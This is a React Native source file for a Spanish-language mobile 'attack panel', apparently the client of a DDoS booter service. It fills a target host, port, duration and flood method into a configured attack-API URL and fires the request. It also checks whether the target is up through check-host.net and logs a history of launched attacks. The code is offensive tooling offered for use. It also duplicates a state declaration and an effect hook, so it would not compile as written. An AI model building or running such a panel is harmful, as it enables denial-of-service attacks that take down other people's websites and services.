import React, { useState, useEffect } from 'react';
import {
  View,
  Text,
  TextInput,
  TouchableOpacity,
  StyleSheet,
  ScrollView,
  ActivityIndicator,
  KeyboardAvoidingView,
  Platform,
  Alert,
} from 'react-native';
import { Ionicons } from '@expo/vector-icons';
import AsyncStorage from '@react-native-async-storage/async-storage';
import { Picker } from '@react-native-picker/picker';
import axios from 'axios';

interface Method {
  id: string;
  name: string;
  apiId: string;
}

interface APIConfig {
  id: string;
  name: string;
  url: string;
}

export default function AttackPanel() {
  const [host, setHost] = useState('');
  const [port, setPort] = useState('80');
  const [time, setTime] = useState('60');
  const [selectedMethod, setSelectedMethod] = useState('');
  const [methods, setMethods] = useState<Method[]>([]);
  const [apis, setApis] = useState<APIConfig[]>([]);
  const [loading, setLoading] = useState(false);
  const [checkingTarget, setCheckingTarget] = useState(false);
  const [targetStatus, setTargetStatus] = useState<any>(null);
  const [attackSent, setAttackSent] = useState(false);
  const [maxTimeAllowed, setMaxTimeAllowed] = useState(300);

  useEffect(() => {
    loadData();
  }, []);
  const [maxTimeAllowed, setMaxTimeAllowed] = useState(300);

  useEffect(() => {
    loadData();
  }, []);

  const loadData = async () => {
    try {
      const [methodsData, apisData, settings] = await Promise.all([
        AsyncStorage.getItem('methods'),
        AsyncStorage.getItem('apis'),
        AsyncStorage.getItem('settings'),
      ]);

      if (methodsData) {
        const parsedMethods = JSON.parse(methodsData);
        setMethods(parsedMethods);
        if (parsedMethods.length > 0) {
          setSelectedMethod(parsedMethods[0].name);
        }
      }

      if (apisData) {
        setApis(JSON.parse(apisData));
      }

      if (settings) {
        const parsedSettings = JSON.parse(settings);
        setMaxTimeAllowed(parsedSettings.maxTimeAllowed || 300);
      }
    } catch (error) {
      console.error('Error loading data:', error);
    }
  };

  const checkTarget = async () => {
    if (!host) {
      Alert.alert('Error', 'Por favor ingresa un host');
      return;
    }

    setCheckingTarget(true);
    setTargetStatus(null);

    try {
      const checkType = host.includes('http') ? 'http' : 'ping';
      const cleanHost = host.replace(/^https?:\/\//, '').split('/')[0];

      const url = checkType === 'http'
        ? `https://check-host.net/check-http?host=${cleanHost}&max_nodes=3`
        : `https://check-host.net/check-ping?host=${cleanHost}&max_nodes=3`;

      const response = await axios.get(url, {
        headers: { Accept: 'application/json' },
        timeout: 10000,
      });

      if (response.data && response.data.request_id) {
        setTimeout(async () => {
          try {
            const resultUrl = `https://check-host.net/check-result/${response.data.request_id}`;
            const resultResponse = await axios.get(resultUrl, {
              headers: { Accept: 'application/json' },
            });

            let alive = false;
            if (resultResponse.data) {
              for (const key in resultResponse.data) {
                const value = resultResponse.data[key];
                if (value && Array.isArray(value) && value.length > 0) {
                  alive = true;
                  break;
                }
              }
            }

            setTargetStatus({
              status: alive ? 'alive' : 'unreachable',
              details: resultResponse.data,
            });
          } catch (err) {
            setTargetStatus({ status: 'error', message: 'Error al verificar' });
          } finally {
            setCheckingTarget(false);
          }
        }, 2500);
      } else {
        setTargetStatus({ status: 'checking', message: 'Verificando...' });
        setCheckingTarget(false);
      }
    } catch (error) {
      console.error('Error checking target:', error);
      setTargetStatus({ status: 'error', message: 'Error al verificar el objetivo' });
      setCheckingTarget(false);
    }
  };

  const sendAttack = async () => {
    if (!host || !port || !time || !selectedMethod) {
      Alert.alert('Error', 'Por favor completa todos los campos');
      return;
    }

    const timeNum = parseInt(time);
    if (timeNum > maxTimeAllowed) {
      Alert.alert('Error', `El tiempo no puede exceder ${maxTimeAllowed} segundos`);
      return;
    }

    // Find the method and its linked API
    const method = methods.find((m) => m.name === selectedMethod);
    if (!method) {
      Alert.alert('Error', 'Método no encontrado');
      return;
    }

    const api = apis.find((a) => a.id === method.apiId);
    if (!api) {
      Alert.alert('Error', 'API no configurada para este método');
      return;
    }

    setLoading(true);
    setAttackSent(false);

    try {
      const cleanHost = host.replace(/^https?:\/\//, '').split('/')[0];
      
      // Replace placeholders in API URL
      let attackUrl = api.url
        .replace('[host]', cleanHost)
        .replace('[port]', port)
        .replace('[time]', time)
        .replace('[method]', selectedMethod);

      // Send the attack request
      const response = await axios.get(attackUrl, { timeout: 30000 });

      // Save to history
      const historyItem = {
        id: Date.now().toString(),
        host: cleanHost,
        port: parseInt(port),
        time: timeNum,
        method: selectedMethod,
        status: 'sent',
        timestamp: new Date().toISOString(),
      };

      const historyData = await AsyncStorage.getItem('history');
      const history = historyData ? JSON.parse(historyData) : [];
      history.unshift(historyItem);
      await AsyncStorage.setItem('history', JSON.stringify(history.slice(0, 100)));

      setAttackSent(true);
      setTimeout(() => setAttackSent(false), 5000);
    } catch (error: any) {
      console.error('Error sending attack:', error);
      
      // Save as failed in history
      const historyItem = {
        id: Date.now().toString(),
        host: host.replace(/^https?:\/\//, '').split('/')[0],
        port: parseInt(port),
        time: timeNum,
        method: selectedMethod,
        status: 'failed',
        timestamp: new Date().toISOString(),
      };

      const historyData = await AsyncStorage.getItem('history');
      const history = historyData ? JSON.parse(historyData) : [];
      history.unshift(historyItem);
      await AsyncStorage.setItem('history', JSON.stringify(history.slice(0, 100)));

      Alert.alert('Error', 'No se pudo enviar el ataque');
    } finally {
      setLoading(false);
    }
  };

  return (
    <KeyboardAvoidingView
      behavior={Platform.OS === 'ios' ? 'padding' : 'height'}
      style={styles.container}
    >
      <ScrollView
        style={styles.scrollView}
        contentContainerStyle={styles.scrollContent}
        keyboardShouldPersistTaps="handled"
      >
        {/* Target Status Check Panel */}
        <View style={styles.statusPanel}>
          <View style={styles.panelHeader}>
            <Ionicons name="pulse" size={24} color="#00d4ff" />
            <Text style={styles.panelTitle}>Estado del Objetivo</Text>
          </View>

          <TouchableOpacity
            style={styles.checkButton}
            onPress={checkTarget}
            disabled={checkingTarget}
          >
            {checkingTarget ? (
              <ActivityIndicator color="#fff" />
            ) : (
              <>
                <Ionicons name="search" size={20} color="#fff" />
                <Text style={styles.checkButtonText}>Verificar Objetivo</Text>
              </>
            )}
          </TouchableOpacity>

          {targetStatus && (
            <View
              style={[
                styles.statusBox,
                targetStatus.status === 'alive' && styles.statusAlive,
                targetStatus.status === 'unreachable' && styles.statusDead,
                targetStatus.status === 'error' && styles.statusError,
              ]}
            >
              <Ionicons
                name={
                  targetStatus.status === 'alive'
                    ? 'checkmark-circle'
                    : targetStatus.status === 'unreachable'
                    ? 'close-circle'
                    : 'alert-circle'
                }
                size={24}
                color="#fff"
              />
              <Text style={styles.statusText}>
                {targetStatus.status === 'alive'
                  ? 'Objetivo Online'
                  : targetStatus.status === 'unreachable'
                  ? 'Objetivo Inalcanzable'
                  : 'Error al Verificar'}
              </Text>
            </View>
          )}
        </View>

        {/* Attack Panel */}
        <View style={styles.attackPanel}>
          <View style={styles.panelHeader}>
            <Ionicons name="flash" size={24} color="#ff6b6b" />
            <Text style={styles.panelTitle}>Configuración de Ataque</Text>
          </View>

          <View style={styles.inputGroup}>
            <Text style={styles.label}>Host / Dominio</Text>
            <TextInput
              style={styles.input}
              value={host}
              onChangeText={setHost}
              placeholder="ejemplo.com o 192.168.1.1"
              placeholderTextColor="#6b7280"
              autoCapitalize="none"
            />
          </View>

          <View style={styles.row}>
            <View style={[styles.inputGroup, styles.halfWidth]}>
              <Text style={styles.label}>Puerto</Text>
              <TextInput
                style={styles.input}
                value={port}
                onChangeText={setPort}
                placeholder="80"
                placeholderTextColor="#6b7280"
                keyboardType="numeric"
              />
            </View>

            <View style={[styles.inputGroup, styles.halfWidth]}>
              <Text style={styles.label}>Tiempo (seg)</Text>
              <TextInput
                style={styles.input}
                value={time}
                onChangeText={setTime}
                placeholder="60"
                placeholderTextColor="#6b7280"
                keyboardType="numeric"
              />
            </View>
          </View>

          <View style={styles.inputGroup}>
            <Text style={styles.label}>Método</Text>
            <View style={styles.pickerContainer}>
              <Picker
                selectedValue={selectedMethod}
                onValueChange={setSelectedMethod}
                style={styles.picker}
                dropdownIconColor="#00d4ff"
              >
                {methods.length === 0 ? (
                  <Picker.Item label="No hay métodos disponibles" value="" />
                ) : (
                  methods.map((method) => (
                    <Picker.Item
                      key={method.id}
                      label={method.name}
                      value={method.name}
                    />
                  ))
                )}
              </Picker>
            </View>
          </View>

          <TouchableOpacity
            style={[
              styles.attackButton,
              (loading || methods.length === 0) && styles.attackButtonDisabled,
            ]}
            onPress={sendAttack}
            disabled={loading || methods.length === 0}
          >
            {loading ? (
              <ActivityIndicator color="#fff" />
            ) : (
              <>
                <Ionicons name="rocket" size={24} color="#fff" />
                <Text style={styles.attackButtonText}>Lanzar Ataque</Text>
              </>
            )}
          </TouchableOpacity>

          {attackSent && (
            <View style={styles.successBox}>
              <Ionicons name="checkmark-circle" size={32} color="#fff" />
              <Text style={styles.successText}>Ataque Enviado</Text>
            </View>
          )}
        </View>

        <Text style={styles.maxTimeNote}>
          Tiempo máximo permitido: {maxTimeAllowed} segundos
        </Text>
      </ScrollView>
    </KeyboardAvoidingView>
  );
}

const styles = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: '#0f172a',
  },
  scrollView: {
    flex: 1,
  },
  scrollContent: {
    padding: 16,
  },
  statusPanel: {
    backgroundColor: '#1e293b',
    borderRadius: 16,
    padding: 20,
    marginBottom: 16,
    borderWidth: 1,
    borderColor: '#334155',
  },
  attackPanel: {
    backgroundColor: '#1e293b',
    borderRadius: 16,
    padding: 20,
    borderWidth: 1,
    borderColor: '#334155',
  },
  panelHeader: {
    flexDirection: 'row',
    alignItems: 'center',
    marginBottom: 20,
  },
  panelTitle: {
    fontSize: 20,
    fontWeight: 'bold',
    color: '#fff',
    marginLeft: 12,
  },
  checkButton: {
    backgroundColor: '#0f3460',
    flexDirection: 'row',
    alignItems: 'center',
    justifyContent: 'center',
    padding: 14,
    borderRadius: 12,
    gap: 8,
  },
  checkButtonText: {
    color: '#fff',
    fontSize: 16,
    fontWeight: '600',
  },
  statusBox: {
    flexDirection: 'row',
    alignItems: 'center',
    padding: 16,
    borderRadius: 12,
    marginTop: 12,
    gap: 12,
  },
  statusAlive: {
    backgroundColor: '#10b981',
  },
  statusDead: {
    backgroundColor: '#ef4444',
  },
  statusError: {
    backgroundColor: '#f59e0b',
  },
  statusText: {
    color: '#fff',
    fontSize: 16,
    fontWeight: '600',
  },
  inputGroup: {
    marginBottom: 16,
  },
  label: {
    color: '#94a3b8',
    fontSize: 14,
    fontWeight: '600',
    marginBottom: 8,
  },
  input: {
    backgroundColor: '#0f172a',
    borderWidth: 1,
    borderColor: '#334155',
    borderRadius: 12,
    padding: 14,
    color: '#fff',
    fontSize: 16,
  },
  row: {
    flexDirection: 'row',
    gap: 12,
  },
  halfWidth: {
    flex: 1,
  },
  pickerContainer: {
    backgroundColor: '#0f172a',
    borderWidth: 1,
    borderColor: '#334155',
    borderRadius: 12,
    overflow: 'hidden',
  },
  picker: {
    color: '#fff',
    height: 50,
  },
  attackButton: {
    backgroundColor: '#ff6b6b',
    flexDirection: 'row',
    alignItems: 'center',
    justifyContent: 'center',
    padding: 18,
    borderRadius: 12,
    marginTop: 8,
    gap: 12,
  },
  attackButtonDisabled: {
    backgroundColor: '#475569',
  },
  attackButtonText: {
    color: '#fff',
    fontSize: 18,
    fontWeight: 'bold',
  },
  successBox: {
    backgroundColor: '#10b981',
    flexDirection: 'row',
    alignItems: 'center',
    justifyContent: 'center',
    padding: 20,
    borderRadius: 12,
    marginTop: 16,
    gap: 12,
  },
  successText: {
    color: '#fff',
    fontSize: 20,
    fontWeight: 'bold',
  },
  maxTimeNote: {
    color: '#94a3b8',
    fontSize: 12,
    textAlign: 'center',
    marginTop: 12,
  },
});
